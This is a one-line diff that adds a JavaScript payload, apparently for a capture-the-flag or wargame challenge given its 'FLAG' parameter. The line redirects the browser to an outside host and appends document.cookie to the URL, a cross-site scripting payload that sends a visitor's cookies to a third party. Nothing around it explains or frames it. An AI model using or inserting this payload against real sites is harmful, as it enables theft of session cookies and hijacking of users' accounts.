@@ -1,0 +1,1 @@
+location.href='https://warzone.kro.kr/test.php?FLAG='+document.cookie
